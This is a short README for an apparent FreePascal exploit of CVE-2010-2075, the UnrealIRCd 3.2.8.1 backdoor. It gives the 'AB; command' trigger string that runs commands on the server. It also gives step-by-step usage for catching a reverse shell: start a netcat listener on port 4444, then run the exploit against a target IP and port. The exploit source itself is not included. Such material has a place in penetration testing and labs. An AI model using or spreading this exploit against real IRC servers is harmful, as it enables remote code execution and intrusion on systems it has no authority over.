# CVE-2010-2075
FreePascal implementation of CVE-2010-2075

## Vulnerability
### UnrealIRCd 3.2.8.1
RCE by sending "`AB; command`" to any listening service. Any command you send is executed by the same user as UnrealIRCD runs as.

This implementation launches a reverse shell to your listener.

#### Step 1
Start a listener, ex. `netcat -lvp 4444`

#### Step 2
Execute exploit `./exploit <target ip> <target port> <host ip> <host port>` where host ip and port is where your listener is running

## Requirements
Synapse. If you don't have it, install through the OPM
